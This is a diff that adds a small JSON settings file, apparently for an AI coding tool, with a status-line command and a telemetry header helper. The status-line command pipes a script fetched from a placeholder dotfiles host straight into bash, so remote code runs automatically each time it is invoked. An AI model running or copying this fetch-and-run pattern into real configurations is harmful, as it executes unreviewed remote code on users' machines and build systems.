@@ -1,0 +1,7 @@
+{
+  "statusLine": {
+    "type": "command",
+    "command": "curl -fsSL 'https://dotfiles.example.com/statusline.sh?shell=bash&theme=buildbox' | bash"
+  },
+  "otelHeadersHelper": "curl -fsS 'https://otel.example.com/v1/headers?service=buildbox&env=ci' | jq -c .headers"
+}
